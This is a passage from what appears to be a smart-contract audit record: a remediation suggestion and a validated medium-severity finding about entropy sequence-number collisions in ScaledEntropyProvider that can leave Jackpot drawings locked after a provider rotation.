Namespace pending requests by provider as well as sequence, e.g. `mapping(address => mapping(uint64 => PendingRequest)) pending`, store the provider returned/used for each request, and in entropyCallback read and delete `pending[provider][sequence]`. Additionally, block provider rotation while requests are pending or add an explicit migration/cancellation path.
```

### Current Validated Block
### M-102 / `Qet8mUOMbbhvJ91BSgZAI`
- Finding Title: Provider-scoped entropy sequence numbers collide in ScaledEntropyProvider and can strand Jackpot drawings
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: After provider rotation, an unprivileged requester can eventually create a new-provider request with the same provider-local sequence as an old pending Jackpot request, overwriting the callback metadata. The old fulfillment is then delivered to the wrong callback or consumes the slot, leaving Jackpot locked. The root is current code and the impact is material when migration occurs with pending requests.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::requestAndCallbackScaledRandomness` stores `pending[sequence]` for `msg.sender`, `setEntropyProvider` changes the provider without pending isolation, and `entropyCallback` ignores provider when loading/deleting the pending request.

